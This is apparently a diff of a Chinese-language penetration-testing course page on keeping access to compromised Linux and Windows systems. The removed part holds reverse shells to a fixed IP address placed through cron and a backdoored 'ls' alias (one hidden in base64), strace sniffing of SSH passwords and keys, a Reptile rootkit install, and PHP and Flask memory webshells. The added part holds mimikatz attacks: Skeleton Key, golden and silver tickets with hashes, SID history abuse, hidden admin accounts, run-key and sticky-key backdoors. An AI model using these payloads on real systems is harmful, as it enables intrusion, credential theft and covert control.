-#!/bin/bash<br>
-bash -i &gt;&amp; /dev/tcp/47.94.236.117/3333 0&gt;&amp;1<br>
-chmod +x /etc/.xiaodi.sh<br>
-（ 2 ）添加定时任务（分时天月周）<br>
-vim /etc/crontab<br>
-*/1 * * * * root /etc/.xiaodi.sh</p>
-<h4 id="1-235-strace监控后门"><a class="markdownIt-Anchor" href="#1-235-strace监控后门">#</a> 1 2.3.5 Strace 监控后门</h4>
-<p>strace 是一个动态跟踪工具，它可以跟踪系统调用的执行。我们可以把他当<br>
-成一个键盘记录的后门，来扩大我们的信息收集范围。当其他机器登录时，会<br>
-将 ssh 的登录情况保存，可以实现实时监控 ssh 密码，可以将其自动发到外网上。<br>
-（ 1 ）记录 sshd 明文<br>
- (strace -f -F -p  <code>ps aux|grep &quot;sshd -D&quot;|grep -v grep|awk &#123;'print $2'&#125;</code>  -t -e<br>
-trace=read,write -s 32 2&gt; /tmp/.sshd.log &amp;)<br>
-grep -E ‘read(6, “.+\ 0 \ 0 \ 0 \.+”’ /tmp/.sshd.log<br>
-（ 2 ）记录 sshd 私钥</p>
-<p>(strace -f -F -p  <code>ps aux|grep &quot;sshd -D&quot;|grep -v grep|awk &#123;'print $2'&#125;</code>  -t -e<br>
-trace=read,write -s 4096 2&gt; /tmp/.sshd.log &amp;)<br>
-grep ‘PRIVATE KEY’ /tmp/.sshd.log</p>
-<h4 id="1236-alias后门"><a class="markdownIt-Anchor" href="#1236-alias后门">#</a> 12.3.6 Alias 后门</h4>
-<p>（ 1 ）输入 ls 即可反弹 shell<br>
-alias ls=‘alerts(){ ls $* --color=auto;bash -i &gt;&amp; /dev/tcp/47.94.236.117/3333<br>
-0&gt;&amp;1; };alerts’<br>
-这样做效果达到了，但是 ls 原功能无法执行成功<br>
- unalias ls 去掉别名<br>
-（ 2 ）不影响 ls 使用情况下的别名后门：<br>
-alias ls=‘alerts(){ ls $* --color=auto;python3 -c &quot;import base64,sys;exec(bas<br>
-e64.b64decode({2:str,3:lambda b:bytes(b,’’‘UTF-8’’’)}[sys.version_info[0]](’’‘aW1w<br>
-b3J0IG9zLHNvY2tldCxzdWJwcm9jZXNzOwpyZXQgPSBvcy5mb3JrKCkKaWYgc<br>
-mV0ID4gMDoKICAgIGV4aXQoKQplbHNlOgogICAgdHJ5OgogICAgICAgIHMgP<br>
-SBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVF<br>
-JFQU0pCiAgICAgICAgcy5jb25uZWN0KCgiNDcuOTQuMjM2LjExNyIsIDY2NjYp<br>
-KQogICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSwgMCkKICAgICAgICBvcy5kd<br>
-XAyKHMuZmlsZW5vKCksIDEpCiAgICAgICAgb3MuZHVwMihzLmZpbGVubygp<br>
-LCAyKQogICAgICAgIHAgPSBzdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwg<br>
-Ii1pIl0pCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgZXhpdCgp’<br>
-‘’)))&quot;;};alerts’<br>
-alias unalias=‘alerts(){ if [ $# != 0 ]; then if [ $* != “ls” ]&amp;&amp;[ $* != “al<br>
-ias” ]&amp;&amp;[ $* != “unalias” ]; then unalias $*;else echo “-bash: unalias: {*}: n
-ot found";fi;else echo "unalias: usage: unalias [-a] name [name ...]";fi;};alerts'
-alias alias='alerts(){ alias "@” | grep -v unalias | sed &quot;s/alerts.<em>lambda.</em>/ls<br>
-–color=auto’’’/&quot;;};alerts’<br>
-（ 3 ）持久化 + 隐藏：重启依旧生效<br>
- vim /etc/upload<br>
-vim ～/.bashrc<br>
-if [ -f /etc/upload ]; then</p>
-<p>. /etc/upload<br>
-fi</p>
-<h4 id="1237-rootkit后门"><a class="markdownIt-Anchor" href="#1237-rootkit后门">#</a> 12.3.7 Rootkit 后门</h4>
-<p>现在常用的 linux 维持权限的方法大多用 crontab 和开机自启动，同时使用<br>
-的大多是 msf 或者其它的 tcp 连接来反弹 shell , 这种做法比较容易被管理员发<br>
-现。所以我们想有一个非 tcp 连接、流量不容易被怀疑的后门，并且在大量的 s<br>
-hell 的场景下，可以管 shell，Reptile 刚好是种 LKM rootkit，因此具有很好的隐<br>
-藏性和强大的功能。如需检测此后门是否存在，需要使用类似于 gscan、checkr<br>
-ootkit 的工具检测，但不一定能捕获到流量特征。<br>
-项目地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2YwcmIxZGQzbi9SZXB0aWxlL3JlbGVhc2VzLw==">https://github.com/f0rb1dd3n/Reptile/releases/</span><br>
-（ 1 ）centos 自动化脚本<br>
- $kernel= <code>uname -r</code> <br>
-yum -y install perl vim gcc make g++ unzip</p>
-<h1 id="由于cenots内核管理不便所以使用下载对应版本的kernel-devel到本地"><a class="markdownIt-Anchor" href="#由于cenots内核管理不便所以使用下载对应版本的kernel-devel到本地">#</a> 由于 Cenots 内核管理不便，所以使用下载对应版本的 kernel-devel 到本地</h1>
-<p>yum -y localinstall kernel-devel-&quot;kernal".rpm
-cd Reptile-2.0/ && chmod +x ./setup.sh
-./setup.sh install <<EOF 1 2 666 4444 reptile hax0r s3cr3t y 47.94.236.117 eof （ ）ubuntu自动化脚本 apt-get install vim gcc make g++ unzip -y linux-headers-(uname -r)<br>
-cd Reptile-2.0/ &amp;&amp; chmod +x ./setup.sh<br>
-./setup.sh install &lt;&lt;EOF<br>
-reptile<br>
-hax0r<br>
-s3cr3t</EOF></p>
-<p>reptile<br>
-666<br>
-y<br>
-47.94.236.117<br>
-4444<br>
-1<br>
-EOF<br>
-（ 3 ）使用参考：<br>
-<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2YwcmIxZGQzbi9SZXB0aWxlL3dpa2k=">https://github.com/f0rb1dd3n/Reptile/wiki</span><br>
-a. 隐藏进程文件连接属性<br>
-配合 msf 上线，隐藏 msf 的进程<br>
-隐藏进程: /reptile/reptile_cmd hide pid<br>
- 显示进程: /reptile/reptile_cmd show pid<br>
- 隐藏连接: /reptile/reptile_cmd udp pid port hide<br>
- 显示连接: /reptile/reptile_cmd tcp pid port show<br>
- 隐藏文件：文件名中带 reptile 的都会被隐藏 mkdir reptile_xiaodi</p>
-<p>b. 无须木马通过肉机软件直接控制肉机<br>
-客户端安装: ./setup.sh client<br>
- 设置连接配置：要填写的信息为在肉机上安装 rookit 时填写的目标主机 ip<br>
- 和端口，以及自己为其设置的密码和 token 值，至于 22 的端口，是伪造的，可<br>
-以随意填写对方正在运行的端口。<br>
-set LHOST 47.94.236.117<br>
-set LPORT 4444<br>
-set SRCHOST 47.94.236.117<br>
-set SRCPORT 666<br>
-set RHOST 121.43.154.113<br>
-set RPORT 22<br>
-set PROT TCP<br>
-set PASS s3cr3t<br>
-set TOKEN hax0r</p>
-<h3 id="124-web内存马"><a class="markdownIt-Anchor" href="#124-web内存马">#</a> 12.4 web 内存马</h3>
+<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2NseW1iM3IvTWlzYy1XaW5kb3dzLUhhY2tpbmc=">https://github.com/clymb3r/Misc-Windows-Hacking</span></p>
+<p><code>powershell -exec bypass -Command &quot;&amp; &#123;Import-Module 'C:\Invoke-ReflectivePEInjection.ps1';Invoke-ReflectivePEInjection -PEPath C:\HookPasswordChange. dll -procname lsass&#125;&quot;</code></p>
+<h4 id="机制账号启用dsrm"><a class="markdownIt-Anchor" href="#机制账号启用dsrm">#</a> 机制账号启用 DSRM</h4>
+<p>利用系统自带机制模式 DSRM，修改 DSRM 默认登录方式和属性，通过其同步 krgtgt 进行 PTH 攻击，实现持续化控制，但适用于系统 &gt;=windows server2008。每个域控制器都有本地管理员账号和密码（与域管理员账号和密码不同）。DSRM 账号可以作为一个域控制器的本地管理员用户，通过网络连接域控制器，进而控制域控制器。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取dsrm及krbtgt的NTLM <span class="built_in">hash</span></span></span><br><span class="line">privilege::debug</span><br><span class="line">lsadump::lsa /patch /name:krbtgt</span><br><span class="line">token::elevate</span><br><span class="line">lsadump::sam</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">dsrm&amp;krbtgt&amp;NTLM <span class="built_in">hash</span>同步</span></span><br><span class="line">NTDSUTIL：打开ntdsutil</span><br><span class="line">set DSRM password：修改DSRM的密码</span><br><span class="line">sync from domain account 域用户名字：使DSRM的密码和指定域用户的</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">密码同步</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">(第 1 次)：退出DSRM密码设置模式</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">(第 2 次)：退出ntdsutil</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改dsrm登录方式</span></span><br><span class="line">New-ItemProperty &quot;hklm:\system\currentcontrolset\control\lsa\\&quot; -name &quot;dsrmadminlogonbehavior&quot; -value 2 -propertyType DWORD</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">利用PTH传递攻击</span></span><br><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /domain:owa2010cn-god /user:administrator /ntlm:b097d7ed9749</span><br><span class="line">5408e1537f706c357fc5</span><br><span class="line">dir \\owa2010cn-god\c$</span><br></pre></td></tr></table></figure>
+<h4 id="用户属性修改"><a class="markdownIt-Anchor" href="#用户属性修改">#</a> 用户属性修改</h4>
+<p>把域控管理员的 SID 加入到其他某个恶意的域账户的 SID History 中，然后这个恶意的（我们自己创建的）域账户就可以域管理员权限访问域控了，不修改域账户一直存在。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取某用户SID属性</span></span><br><span class="line">Import-Module ActiveDirectory</span><br><span class="line">Get-ADUser webadmin -Properties sidhistory</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">给予某用户administrator属性</span></span><br><span class="line">privilege::debug</span><br><span class="line">sid::patch</span><br><span class="line">sid::add /sam:webadmin /new:administrator</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">测评给与前后的DC访问权限：</span></span><br><span class="line">dir \\192.168.3.21\c$</span><br></pre></td></tr></table></figure>
+<h4 id="登录进程劫持"><a class="markdownIt-Anchor" href="#登录进程劫持">#</a> 登录进程劫持</h4>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">因为Skeleton Key技术是被注入到lsass.exe进程的，所以它只存在内存中，如域控重启，万能密码将失效。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">测试域内某个用户与DC通讯</span> </span><br><span class="line">dir \\owa2010cn-god\c$</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">连接DC后，DC注入lsass进程</span></span><br><span class="line">net use \\192.168.3.21\ipc$ &quot;Admin12345&quot; /user:god\administrator</span><br><span class="line">mimikatz：</span><br><span class="line">privilege::debug</span><br><span class="line">misc::skeleton</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重新测试域内某个用户与DC通讯</span></span><br><span class="line">net use \\owa2010cn-god\ipc$ &quot;mimikatz&quot; /user:god\administrator</span><br><span class="line">dir \\owa2010cn-god\c$</span><br></pre></td></tr></table></figure>
+<h4 id="隐藏域管用户"><a class="markdownIt-Anchor" href="#隐藏域管用户">#</a> 隐藏域管用户</h4>
+<p>项目地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3dncHNlYy9DcmVhdGVIaWRkZW5BY2NvdW50">https://github.com/wgpsec/CreateHiddenAccount</span><br>
+ 控制面板能查看到，命令查看看不到，单机版无法删除，域环境可以删除。<br>
+CreateHiddenAccount -u xiaodi -p Xiaodi!@#45</p>
+<h4 id="黄金票据"><a class="markdownIt-Anchor" href="#黄金票据">#</a> 黄金票据</h4>
+<p>黄金票据生成攻击，是生成有效的 TGT Kerberos 票据，并且不受 TGT 生命周期的影响（TGT 默认 10 小时，最多续订 7 天），这里可以为任意用户生称黄金票据，然后为域管理员生成 TGT，这样普通用户就可以变成域管理员。</p>
+<p>已经拿下域管理员，获取到 krbtgt hash; 利用 krbtgt 的 hash 制作黄金票据 工具，进行攻击。该攻击方式其实是一种后门的形式，属于第二次进行攻击的 方法。第一次拿到域管权限之后，需要将 krbtgt NTLM hash 进行保存，当第二 次再来进行域渗透攻击时，我们就可使用 krbtgt 的 NTLM hash 制作黄金票据， 从而再次获得域管权限。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取域名，域sid值</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">域名：god.org，域SID值：S-1-5-21-1218902331-2157346161-1782232778</span></span><br><span class="line">whoami /user</span><br><span class="line">whoami /all</span><br><span class="line">wmic useraccount get name,sid</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取krbtgt的ntlm：域的KRBTGT账户NTLM-HASH：b097d7ed97495408e1537f706c357fc5</span></span><br><span class="line">mimikatz privilege::debug</span><br><span class="line">mimikatz lsadump::lsa /patch</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">伪造用户名：webadmin（任意用户名）</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">生成票据</span></span><br><span class="line">mimikatz kerberos::golden /user:webadmin /domain:god.org /sid:S-1-5-21-1218902331-2157346161-1782232778 /krbtgt:b097d7ed97495408e1537f706c357fc5 /ticket:g</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">导入内存</span></span><br><span class="line">mimikatz kerberos::ptt g</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">访问测试</span></span><br><span class="line">dir \\owa2010cn-god\c$</span><br></pre></td></tr></table></figure>
+<h4 id="白银票据"><a class="markdownIt-Anchor" href="#白银票据">#</a> 白银票据</h4>
+<p>白银票据 (SILVER TICKET) 是利用域的服务账户进行伪造的 ST，在 Ker beros 认证的第三步，Client 带着 ST 和 Authenticator3 向 Server 上的某个服务进 行请求，Server 接收到 Client 的请求之后，通过自己的 Master Key 解密 ST， 从而获得 Session Key。所以只需要知道 Server 用户的 Hash 就可以伪造出一个 ST，且不会经过 KDC，但是伪造的门票只对部分服务起作用 (不需要交互 KDC，需要知道 Server 的 NTLM Hash)。</p>
+<p>已经拿下域管理员，获取到 DC hash；利用 DC 的 hash 制作白银票据工具，进行攻击。伪造的 ST，只能访问指定的服务，如 CIFS；不与 KDC 交互，直接</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">访问Server；ST由服务账号 NTLM Hash 加密。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取域名，域sid值</span></span><br><span class="line">域名：god.org、域SID值：S-1-5-21-1218902331-2157346161-1782232778</span><br><span class="line">whoami /user</span><br><span class="line">whoami /all</span><br><span class="line">wmic useraccount get name,sid</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取dc账户的ntlm：域DC账户NTLM-HASH：82779569ef27d72b88b6c93dd8b37299</span></span><br><span class="line">mimikatz privilege::debug</span><br><span class="line">mimikatz sekurlsa::logonpasswords</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">伪造用户名：webadmin（任意用户名）</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">导入票据：（CIFS文件共享服务）</span></span><br><span class="line">domain：域名</span><br><span class="line">sid：域环境下的SID，除去最后-的部分剩下的内容</span><br><span class="line">target：要访问的服务器，写FQDN</span><br><span class="line">rc4：写的是目标主机的NTLM（主机名$对应NTLM）</span><br><span class="line">service：要访问的资源类型</span><br><span class="line">user：伪造的用户</span><br><span class="line">cifs：共享文件</span><br><span class="line">mimikatz kerberos::golden /user:webadmin /domain:god.org /sid:S-1-5-21-1218902331-2157346161-1782232778 /target:owa2010cn-god /service:cifs /rc4:82779569ef27d72b88b6c93dd8b37299 /ptt</span><br></pre></td></tr></table></figure>
+<h4 id="上传白名单工具"><a class="markdownIt-Anchor" href="#上传白名单工具">#</a> 上传白名单工具</h4>
+<p>横向移动在上传木马的时候，将这两款软件直接上传上去，powershell 读配置文件将连接账户和密码发送至外边，进行连接！</p>
+<p>GotoHTTP：<span class="exturl" data-url="aHR0cHM6Ly9nb3RvaHR0cC5jb20vZ290by9kb3dubG9hZC4xMng=">https://gotohttp.com/goto/download.12x</span><br>
+RustDesk：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3J1c3RkZXNrL3J1c3RkZXNr">https://github.com/rustdesk/rustdesk</span></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">有网连接：</span></span><br><span class="line">C:\Users\用户名\AppData\Roaming\RustDesk\config</span><br><span class="line">其中ID和密码在RustDesk.toml文件里。</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">无网内网连接：IP直连</span></span><br><span class="line">RustDesk2.toml</span><br><span class="line">direct-server = &#x27;Y&#x27;</span><br><span class="line">direct-access-port = &#x27;8443&#x27;</span><br></pre></td></tr></table></figure>
+<h3 id="win-权限维持"><a class="markdownIt-Anchor" href="#win-权限维持">#</a> win 权限维持</h3>
+<h4 id="自启动"><a class="markdownIt-Anchor" href="#自启动">#</a> 自启动</h4>
 <ul>
-<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2p3ZW55L01lbVNoZWxsRGVtbw==">https://github.com/jweny/MemShellDemo</span><br>
-Webshell 内存马，是在内存中写入恶意后门和木马并执行，达到远程控制<br>
- Web 服务器的一类内存马，其瞄准了企业的对外窗口：网站、应用。但传统的<br>
- Webshell 都是基于文件类型的，黑客可以利用上传工具或网站漏洞植入木马，<br>
-区别在于 Webshell 内存马是无文件马，利用中间件的进程执行某些恶意代码，<br>
-不会有文件落地，给检测带来巨大难度。<br>
-内存 webshell 相比于常规 webshell 更容易躲避传统安全监测设备的检测，<br>
-通常被用来做持久化，规避检测，持续驻留目标服务器。无文件攻击、内存 We<br>
-bshell、进程注入等基于内存的攻击手段也受到了大多数攻击者青睐。</li>
+<li>自启动路径加载</li>
 </ul>
-<h4 id="1241-php内存马"><a class="markdownIt-Anchor" href="#1241-php内存马">#</a> 12.4.1 php 内存马</h4>
-<p>set_time_limit () 函数：设置允许脚本运行的时间，单位为秒（如果设置该运<br>
-行时间，sleep () 函数在执行程序时的持续时间将会被忽略掉）<br>
-ignore_user_abort () 函数：函数设置与客户机断开是否会终止脚本的执行<br>
-（如果设置为 True，则忽略与用户的断开）<br>
-unlink (FILE) 函数：删除文件（防止文件落地被检测工具查杀）<br>
-file_put_contents 函数：将一个字符串写入该文件中<br>
- usleep 函数：延迟执行当前脚本数微秒，即条件竞争</p>
-<?php
-ignore_user_abort(true);
-set_time_limit(0);
-@unlink(__FILE__);
-$file = '.HH.php';
-$code = '<?php @eval($_POST[\'c\']); ?>';
-<p>while (1){<br>
-file_put_contents(<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mi>i</mi><mi>l</mi><mi>e</mi><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">file,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mpunct">,</span></span></span></span>code);<br>
-usleep(5000);<br>
-}<br>
-?&gt;</p>
-<h4 id="1242-py内存马"><a class="markdownIt-Anchor" href="#1242-py内存马">#</a> 12.4.2 py 内存马</h4>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[http://47.94.236.117:5000/test?param=&#123;&#123;url_for.__globals__[%27__builtins__%](http://47.94.236.117:5000/test?param=&#123;&#123;url_for.__globals__[%27__builtins__%)</span><br><span class="line"><span class="meta prompt_">27][%</span><span class="language-bash">27eval%27](%22app.add_url_rule(%27/shell%27,%20%27shell%27,%20lamb</span></span><br><span class="line"><span class="meta prompt_">da%</span><span class="language-bash">20:__import__(%27os%27).popen(_request_ctx_stack.top.request.args.get(%27c</span></span><br><span class="line"><span class="meta prompt_">md%</span><span class="language-bash">27,%20%27whoami%27)).<span class="built_in">read</span>())%22,&#123;%27_request_ctx_stack%27:url_for.__g</span></span><br><span class="line"><span class="meta prompt_">lobals__[%</span><span class="language-bash">27_request_ctx_stack%27],%27app%27:url_for.__globals__[%27current_</span></span><br><span class="line"><span class="meta prompt_">app%</span><span class="language-bash">27]&#125;)&#125;&#125;</span></span><br><span class="line">[http://47.94.236.117:5000/shell?cmd=ls](http://47.94.236.117:5000/shell?cmd=ls)</span><br><span class="line">https://xz.aliyun.com/t/10933</span><br><span class="line">url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](</span><br><span class="line">&quot;app.add_url_rule(</span><br><span class="line">&#x27;/shell&#x27;,</span><br><span class="line">&#x27;shell&#x27;,</span><br><span class="line">lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;,</span><br><span class="line">&#x27;whoami&#x27;)).read()</span><br><span class="line">)&quot;,</span><br><span class="line">&#123;</span><br><span class="line">&#x27;_request_ctx_stack&#x27;:url_for.__globals__[&#x27;_request_ctx_stack&#x27;],</span><br><span class="line">&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]</span><br><span class="line">&#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
-<h4 id="1243-java内存马"><a class="markdownIt-Anchor" href="#1243-java内存马">#</a> 12.4.3 java 内存马</h4>
-<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuc2VjcHVsc2UuY29tL2FyY2hpdmVzLzE5MDU0OS5odG1s">https://www.secpulse.com/archives/190549.html</span><br>
-（ 1 ）按攻击思路，大致分为：<br>
+<p>C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\</p>
+<ul>
+<li>自启动服务加载</li>
+</ul>
+<p>sc create ServiceTest binPath= C:\xd.exe start= auto<br>
+sc delete ServiceTest</p>
+<ul>
+<li>自启动注册表加载</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">当前用户键值</span></span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">服务器键值（需要管理员权限）</span></span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加启动项</span></span><br><span class="line">REG ADD &quot;HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot; /V &quot;backdoor&quot; /t REG_SZ /F /D &quot;C:\xd.exe&quot;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>计划计时任务 参考前面横向移动课程</li>
+</ul>
+<h4 id="粘滞键"><a class="markdownIt-Anchor" href="#粘滞键">#</a> 粘滞键</h4>
+<p>系统自带的辅助功能进行替换执行，放大镜，旁白，屏幕键盘等均可。基本没用了。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">粘滞键位置</span></span><br><span class="line">c:\windows\system32\sethc.exe</span><br><span class="line">move sethc.exe sethc1.exe</span><br><span class="line">copy cmd.exe sethc.exe</span><br></pre></td></tr></table></figure>
+<h4 id="映像劫持"><a class="markdownIt-Anchor" href="#映像劫持">#</a> 映像劫持</h4>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">测试：执行notepad成cmd</span></span><br><span class="line">REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe&quot; /v debugger /t REG_SZ /d &quot;C:\Windows\System32\cmd.exe /c calc&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配合GlobalFlag隐藏：执行正常关闭后触发</span></span><br><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ImageFile Execution Options\notepad.exe&quot; /v GlobalFlag /t REG_DWORD /d 512</span><br><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe&quot; /v ReportingMode /t REG_DWORD /d 1</span><br><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe&quot; /v MonitorProcess /d &quot;C:\xd.exe&quot;</span><br></pre></td></tr></table></figure>
+<h4 id="屏保与登录"><a class="markdownIt-Anchor" href="#屏保与登录">#</a> 屏保与登录</h4>
